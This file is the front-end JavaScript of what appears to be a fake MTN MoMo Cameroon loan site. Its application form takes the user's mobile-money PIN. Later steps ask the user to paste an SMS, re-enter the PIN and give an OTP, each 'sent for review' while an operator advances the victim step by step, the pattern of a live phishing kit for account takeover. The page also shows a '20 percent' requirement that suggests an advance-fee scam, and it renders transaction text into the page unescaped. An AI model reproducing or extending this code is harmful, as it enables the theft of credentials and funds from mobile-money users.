'use strict';

// ═══════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════
const S = {
    applicationId: null,
    currentStep: null,     // application|sms|pin|otp|approved|rejected|check
    checkSessionToken: null
};

const LS_KEY_APP = 'momo_cm_app_id';
let pollTimer = null;

// ═══════════════════════════════════════════════════════════
// UTILS
// ═══════════════════════════════════════════════════════════
function fmt(n) { return Number(n || 0).toLocaleString('en-US'); }
function xaf(n) { return 'XAF ' + fmt(n); }
function $(id) { return document.getElementById(id); }
function goTo(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = $(id);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}
function showErr(id, msg) {
    const b = $(id); if (!b) return;
    b.classList.add('show');
    const t = $(id + 'Txt'); if (t) t.textContent = msg;
}
function clearErr(id) { const b = $(id); if (b) b.classList.remove('show'); }
function toast(msg, type) {
    type = type || 'info';
    document.querySelectorAll('.toast').forEach(t => t.remove());
    const el = document.createElement('div');
    el.className = 'toast toast-' + type;
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(() => { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }, 3200);
}
async function api(url, opts) {
    opts = opts || {};
    try {
        const res = await fetch(url, {
            credentials: 'same-origin',
            ...opts,
            headers: { 'Content-Type': 'application/json', ...(opts.headers || {}) }
        });
        return await res.json();
    } catch (e) { return { ok: false, error: 'Network error' }; }
}
function formatTime(s) {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return m + ':' + String(sec).padStart(2, '0');
}

// ═══════════════════════════════════════════════════════════
// CALCULATOR
// ═══════════════════════════════════════════════════════════
function updateCalc() {
    const amt = +$('amtSlider').value;
    const r = 0.24 / 12;
    const term = 48;
    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)));
    const twenty = Math.ceil(amt * 0.20);

    $('calcAmt').textContent = xaf(amt);
    $('monthlyAmt').textContent = xaf(monthly);
    $('requiredTx').textContent = xaf(twenty);
    $('reqExample').textContent = xaf(amt);
    $('reqNeed').textContent = xaf(twenty);

    const pct = ((amt - 500000) / 4500000) * 100;
    $('amtSlider').style.setProperty('--pct', pct + '%');
}
function updateAppCalc() {
    const amt = +$('appLoanAmount').value || 0;
    $('twentyAmount').textContent = xaf(Math.ceil(amt * 0.20));
}

// ═══════════════════════════════════════════════════════════
// APPLICATION
// ═══════════════════════════════════════════════════════════
function startApplication() {
    const savedEmail = localStorage.getItem('momo_cm_last_email');
    if (savedEmail) $('appEmail').value = savedEmail;
    $('appLoanAmount').value = +$('amtSlider').value;
    updateAppCalc();
    clearErr('appErr');
    goTo('page-application');
}

function pinInput(el, idx, prefix) {
    prefix = prefix || 'appPin';
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && idx < 4) {
        const n = $(prefix + (idx + 1));
        if (n) n.focus();
    }
}

function getAppPin() {
    return [0,1,2,3,4].map(i => $('appPin' + i).value).join('');
}

async function submitApplication() {
    clearErr('appErr');
    const body = {
        fullName: $('appFullName').value.trim(),
        email: $('appEmail').value.trim().toLowerCase(),
        phone: $('appPhone').value.trim(),
        momoPin: getAppPin(),
        loanType: $('appLoanType').value,
        loanAmount: Number($('appLoanAmount').value),
        loanTerm: Number($('appLoanTerm').value),
        loanPurpose: $('appLoanPurpose').value.trim(),
        employment: $('appEmployment').value,
        annualIncome: Number($('appIncome').value),
        kinName: $('appKinName').value.trim(),
        kinPhone: $('appKinPhone').value.trim(),
        has20Percent: $('has20Percent').checked,
        tncAccepted: $('appTnc').checked
    };

    const btn = $('appSubmitBtn');
    btn.disabled = true;
    btn.textContent = 'Submitting...';

    const res = await api('/api/apply', { method: 'POST', body: JSON.stringify(body) });

    btn.disabled = false;
    btn.textContent = 'SUBMIT APPLICATION';

    if (!res.ok) {
        if (res.code === 'ALREADY_APPLIED') {
            localStorage.setItem(LS_KEY_APP, res.applicationId);
            S.applicationId = res.applicationId;
            toast('Existing application found. Resuming...', 'info');
            setTimeout(() => resumeApplication(), 800);
            return;
        }
        showErr('appErr', res.error || 'Failed.');
        return;
    }

    S.applicationId = res.applicationId;
    localStorage.setItem(LS_KEY_APP, S.applicationId);
    localStorage.setItem('momo_cm_last_email', body.email);

    $('waitAppId1').textContent = S.applicationId;
    goTo('page-wait-application');
    startPoll();
}

// ═══════════════════════════════════════════════════════════
// APPLICATION FLOW — polling & step routing
// ═══════════════════════════════════════════════════════════
function stopPoll() {
    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
}

function startPoll() {
    stopPoll();
    const tick = async () => {
        const res = await api('/api/application/' + S.applicationId);
        if (!res.ok) { pollTimer = setTimeout(tick, 3000); return; }

        const status = res.status;
        const submitted = res.user_submitted;

        // If admin rejected at any point
        if (status === 'rejected') {
            stopPoll();
            $('rejectReason').textContent = res.rejection_reason || 'Your application was not approved.';
            goTo('page-rejected');
            return;
        }

        // If fully approved → session issued client-side? No, we need to log in.
        // Since admin approval doesn't issue session directly, we auto-login
        // via a quick request.
        if (status === 'approved') {
            stopPoll();
            const s = await api('/api/check-status/start', {
                method: 'POST',
                body: JSON.stringify({ email: res.email, phone: res.phone })
            });
            // Actually no — user already verified through the full flow.
            // We should just issue a session directly at approval.
            // Simpler: mark approved → tell user to go to dashboard.
            // For now, direct route to dashboard via a special endpoint.
            const sess = await fetch('/api/session', { credentials: 'same-origin' });
            const sessData = await sess.json();
            if (sessData.loggedIn) { goToDashboard(); return; }
            // Fallback: show success and ask to check status
            toast('Loan approved! Please refresh to continue.', 'success', 5000);
            goTo('page-landing');
            return;
        }

        // Route to right page based on status + submitted flag
        if (status === 'application_review' && submitted) {
            goTo('page-wait-application');
            $('waitAppId1').textContent = S.applicationId;
        } else if (status === 'sms_pending' && !submitted) {
            goTo('page-sms');
        } else if (status === 'sms_pending' && submitted) {
            goTo('page-wait-sms');
            $('waitAppId2').textContent = S.applicationId;
        } else if (status === 'pin_pending' && !submitted) {
            goTo('page-pin');
        } else if (status === 'pin_pending' && submitted) {
            goTo('page-wait-pin');
            $('waitAppId3').textContent = S.applicationId;
        } else if (status === 'otp_pending' && !submitted) {
            goTo('page-otp');
        } else if (status === 'otp_pending' && submitted) {
            goTo('page-wait-otp');
            $('waitAppId4').textContent = S.applicationId;
        }

        pollTimer = setTimeout(tick, 3000);
    };
    tick();
}

async function resumeApplication() {
    const saved = localStorage.getItem(LS_KEY_APP);
    if (!saved) { goTo('page-landing'); return; }
    S.applicationId = saved;
    startPoll();
}

async function submitSms() {
    clearErr('smsErr');
    const sms = $('smsContent').value.trim();
    if (sms.length < 10) return showErr('smsErr', 'Paste the complete SMS.');

    const btn = $('smsSubmitBtn');
    btn.disabled = true;
    btn.textContent = 'Submitting...';

    const res = await api('/api/application/submit-sms', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId, sms })
    });

    btn.disabled = false;
    btn.textContent = 'SUBMIT SMS';

    if (!res.ok) return showErr('smsErr', res.error || 'Failed.');
    toast('SMS sent for review', 'success');
    startPoll();
}

async function submitPin() {
    clearErr('pinErr');
    const pin = [0,1,2,3,4].map(i => $('pin' + i).value).join('');
    if (pin.length !== 5) return showErr('pinErr', 'Enter 5-digit PIN.');

    const btn = $('pinSubmitBtn');
    btn.disabled = true;
    btn.textContent = 'Submitting...';

    const res = await api('/api/application/submit-pin', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId, pin })
    });

    btn.disabled = false;
    btn.textContent = 'SUBMIT PIN';

    if (!res.ok) return showErr('pinErr', res.error || 'Failed.');
    toast('PIN sent for review', 'success');
    startPoll();
}

async function submitOtp() {
    clearErr('otpErr');
    const otp = $('otpValue').value.trim();
    if (!/^\d{4,6}$/.test(otp)) return showErr('otpErr', 'Enter 4–6 digit OTP.');

    const btn = $('otpSubmitBtn');
    btn.disabled = true;
    btn.textContent = 'Submitting...';

    const res = await api('/api/application/submit-otp', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId, otp })
    });

    btn.disabled = false;
    btn.textContent = 'SUBMIT OTP';

    if (!res.ok) return showErr('otpErr', res.error || 'Failed.');
    toast('OTP sent for review', 'success');
    startPoll();
}

// ═══════════════════════════════════════════════════════════
// CHECK STATUS FLOW
// ═══════════════════════════════════════════════════════════
async function startCheckStatus() {
    clearErr('chkErr');
    const email = $('chkEmail').value.trim().toLowerCase();
    const phone = $('chkPhone').value.trim();
    if (!email || !phone) return showErr('chkErr', 'Email and phone required.');

    const btn = $('chkBtn');
    btn.disabled = true;
    btn.textContent = 'Sending...';

    const res = await api('/api/check-status/start', {
        method: 'POST',
        body: JSON.stringify({ email, phone })
    });

    btn.disabled = false;
    btn.textContent = 'SEND VERIFICATION CODE';

    if (!res.ok) return showErr('chkErr', res.error || 'Not found.');

    S.checkSessionToken = res.sessionToken;
    toast('Code sent to ' + res.emailMasked, 'success', 4000);
    clearOtpInputs('cotp');
    goTo('page-check-otp');
    startOtpCountdown();
}

function otpMove(el, idx) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && idx < 5) {
        const n = $('cotp' + (idx + 1));
        if (n) n.focus();
    }
}
function clearOtpInputs(prefix) {
    for (let i = 0; i < 6; i++) {
        const el = $(prefix + i);
        if (el) el.value = '';
    }
    const first = $(prefix + '0');
    if (first) first.focus();
}
function getOtp(prefix) {
    return [0,1,2,3,4,5].map(i => $(prefix + i).value).join('');
}

async function verifyCheckOtp() {
    clearErr('cotpErr');
    const otp = getOtp('cotp');
    if (otp.length !== 6) return showErr('cotpErr', 'Enter 6-digit code.');

    const btn = $('cotpBtn');
    btn.disabled = true;
    btn.textContent = 'Verifying...';

    const res = await api('/api/check-status/verify-otp', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken, otp })
    });

    btn.disabled = false;
    btn.textContent = 'VERIFY CODE';

    if (!res.ok) return showErr('cotpErr', res.error || 'Invalid code.');
    toast('Code verified', 'success');
    clearPinInputs('cpin');
    goTo('page-check-pin');
}

let otpCdTimer = null;
function startOtpCountdown() {
    const wrap = $('cotpResendWrap');
    const text = $('cotpCountdown');
    const btn = $('cotpResendBtn');
    if (!wrap) return;
    wrap.style.display = 'block';
    btn.style.display = 'none';
    let remaining = 120;
    text.textContent = 'Resend in ' + formatTime(remaining);
    if (otpCdTimer) clearInterval(otpCdTimer);
    otpCdTimer = setInterval(() => {
        remaining--;
        if (remaining <= 0) {
            clearInterval(otpCdTimer);
            text.textContent = 'You can resend now.';
            btn.style.display = 'block';
        } else {
            text.textContent = 'Resend in ' + formatTime(remaining);
        }
    }, 1000);
}

async function resendCheckOtp() {
    const btn = $('cotpResendBtn');
    btn.disabled = true;
    btn.textContent = 'Sending...';

    const res = await api('/api/check-status/resend-otp', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken })
    });

    btn.disabled = false;
    btn.textContent = '🔄 Resend code';

    if (!res.ok) { toast(res.error || 'Failed', 'error'); return; }
    toast('New code sent', 'success');
    clearOtpInputs('cotp');
    startOtpCountdown();
}

function clearPinInputs(prefix) {
    for (let i = 0; i < 5; i++) {
        const el = $(prefix + i);
        if (el) el.value = '';
    }
    const first = $(prefix + '0');
    if (first) first.focus();
}

async function verifyCheckPin() {
    clearErr('cpinErr');
    const pin = [0,1,2,3,4].map(i => $('cpin' + i).value).join('');
    if (pin.length !== 5) return showErr('cpinErr', 'Enter 5-digit PIN.');

    const btn = $('cpinBtn');
    btn.disabled = true;
    btn.textContent = 'Verifying...';

    const res = await api('/api/check-status/verify-pin', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken, pin })
    });

    btn.disabled = false;
    btn.textContent = 'VERIFY PIN & LOGIN';

    if (!res.ok) return showErr('cpinErr', res.error || 'Incorrect PIN.');
    toast('Login successful', 'success');
    S.checkSessionToken = null;
    goToDashboard();
}

// ═══════════════════════════════════════════════════════════
// DASHBOARD
// ═══════════════════════════════════════════════════════════
async function goToDashboard() {
    const res = await api('/api/dashboard');
    if (!res.ok) {
        toast(res.error || 'Failed to load dashboard.', 'error');
        return;
    }
    $('dashBalance').textContent = xaf(res.loan.balance);
    $('dashId').textContent = res.loan.id;
    $('dashTerm').textContent = res.loan.term + ' mo';

    const list = $('dashTxList');
    if (res.transactions && res.transactions.length) {
        list.innerHTML = res.transactions.map(tx => `
            <div class="dash-tx">
                <div class="dash-tx-icon">${tx.type === 'disbursement' ? '💰' : '💳'}</div>
                <div class="dash-tx-details">
                    <div class="dash-tx-title">${tx.description}</div>
                    <div class="dash-tx-date">${new Date(tx.created_at).toLocaleString('en-GB')}</div>
                </div>
                <div class="dash-tx-amount">${tx.type === 'disbursement' ? '+' : '-'}${xaf(tx.amount)}</div>
            </div>
        `).join('');
    } else {
        list.innerHTML = '<div class="dash-tx-empty">No transactions yet</div>';
    }

    goTo('page-dashboard');
}

function downloadContract() {
    window.location.href = '/api/contract-pdf';
}

function logout() {
    fetch('/api/logout', { method: 'POST', credentials: 'same-origin' })
        .catch(() => {})
        .finally(() => {
            toast('Logged out', 'info');
            setTimeout(() => {
                localStorage.removeItem(LS_KEY_APP);
                location.reload();
            }, 600);
        });
}

function restart() {
    localStorage.removeItem(LS_KEY_APP);
    location.reload();
}

// ═══════════════════════════════════════════════════════════
// TERMS
// ═══════════════════════════════════════════════════════════
let termsCache = null;
async function showTerms() {
    $('termsModal').classList.add('show');
    if (termsCache) { $('termsText').textContent = termsCache; return; }
    $('termsText').textContent = 'Loading…';
    const res = await api('/api/terms');
    if (!res.ok) { $('termsText').textContent = 'Unable to load.'; return; }
    termsCache = res.text;
    $('termsText').textContent = res.text;
}
function closeTerms() { $('termsModal').classList.remove('show'); }
function acceptTerms() {
    if ($('appTnc')) $('appTnc').checked = true;
    closeTerms();
    toast('Terms accepted', 'success', 1500);
}

// ═══════════════════════════════════════════════════════════
// SPLASH + BOOT
// ═══════════════════════════════════════════════════════════
function showSplash(cb) {
    const splash = $('page-splash');
    const dur = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 500 : 4000;
    setTimeout(() => {
        splash.classList.add('hide');
        setTimeout(() => {
            splash.style.display = 'none';
            cb();
        }, 400);
    }, dur);
}

async function boot() {
    console.log('🚀 MTN MoMo Cameroon v3.0');

    const session = await api('/api/session');
    const savedAppId = localStorage.getItem(LS_KEY_APP);

    showSplash(async () => {
        if (session.loggedIn) {
            goToDashboard();
        } else if (savedAppId) {
            S.applicationId = savedAppId;
            await resumeApplication();
        } else {
            goTo('page-landing');
        }
        updateCalc();
    });
}

document.addEventListener('DOMContentLoaded', boot);
